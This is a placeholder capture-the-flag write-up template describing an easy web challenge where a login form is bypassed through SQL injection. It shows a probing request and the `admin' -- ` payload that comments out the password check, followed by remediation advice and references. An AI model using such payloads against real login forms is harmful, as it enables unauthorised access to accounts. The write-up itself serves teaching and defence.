# Example: SQL Injection Login Bypass (Web, 150 pts): Sample CTF 2026

> **This is a placeholder writeup** that shows how the template renders on the site. Replace it with a real one.

| Field      | Value |
|------------|-------|
| Platform   | Example Platform |
| Event      | Sample CTF 2026 |
| Date       | 2026-10-17 |
| Category   | web |
| Difficulty | Easy |
| Points     | 150 (static) |
| Solves     | n/a |
| Author     | n/a |
| Solved by  | your-handle |
| Status     | Solved during event |
| Tags       | SQL Injection, Authentication, Burp Suite, CWE-89 |

## TL;DR
The login form builds its SQL query by string concatenation. A quote in the username field breaks out of the string and bypasses the password check.

## Challenge
> Only the admin can see the flag. Can you log in?

- Service: `http://chal.example.lab:8080` (event infrastructure, now offline)

## First look
A single login form posting `username` and `password`. I sent a single quote to see how the application handles unexpected input.

```http
POST /login HTTP/1.1
Host: chal.example.lab:8080
Content-Type: application/x-www-form-urlencoded

username=admin'&password=x
```

The response was a 500 with a database syntax error, which confirms the input reaches the query unescaped.

## Dead ends
- Default credentials (`admin:admin`, `admin:password`) -> rejected.
- Directory brute force -> only `/login` and `/static`, nothing useful.

## Solution
### Step 1: Work out the query shape
The error message suggested a query like this:

```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```

### Step 2: Comment out the password check
Closing the string and commenting out the rest removes the password condition.

```
username: admin' -- 
password: anything
```

The server responded with a session cookie for `admin`, and the dashboard showed the flag.

## Flag
`CTF{example_flag}`

## Lessons learned
- Root cause is CWE-89. The fix is parameterised queries, not input filtering.
- Verbose database errors gave away the query structure. Production apps should return a generic error.

## References
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
